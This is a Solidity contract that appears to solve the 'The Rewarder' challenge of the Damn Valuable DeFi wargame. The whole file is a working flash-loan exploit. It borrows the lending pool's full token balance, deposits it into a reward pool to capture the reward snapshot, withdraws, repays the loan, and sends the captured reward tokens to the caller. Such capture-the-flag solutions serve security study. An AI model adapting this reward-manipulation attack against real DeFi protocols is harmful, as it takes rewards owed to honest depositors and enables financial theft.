// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/RewardToken.sol";
import "../DamnValuableToken.sol";

contract TheRewarderAttack {
    FlashLoanerPool flashPool;
    TheRewarderPool rewardPool;
    DamnValuableToken damnValuableToken;
    RewardToken rewardToken;

    constructor(address _flashLoanerPoolAddress, address _theRewarderPoolAddress) {
        flashPool = FlashLoanerPool(_flashLoanerPoolAddress);
        rewardPool = TheRewarderPool(_theRewarderPoolAddress);
        damnValuableToken = flashPool.liquidityToken();
        rewardToken = rewardPool.rewardToken();
    }

    function attack() public {
        // take out flash loan
        uint256 flashPoolBalance = damnValuableToken.balanceOf(address(flashPool));
        flashPool.flashLoan(flashPoolBalance);

        // transfer reward tokens to attacker
        uint256 rewardTokenBalance = rewardToken.balanceOf(address(this));
        rewardToken.transfer(msg.sender, rewardTokenBalance);
    }

    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(flashPool));

        // deposit tokens, earn reward tokens
        damnValuableToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);

        // withdraw tokens
        rewardPool.withdraw(amount);

        // pay back loan
        damnValuableToken.transfer(address(flashPool), amount);
    }

    receive() external payable {}
}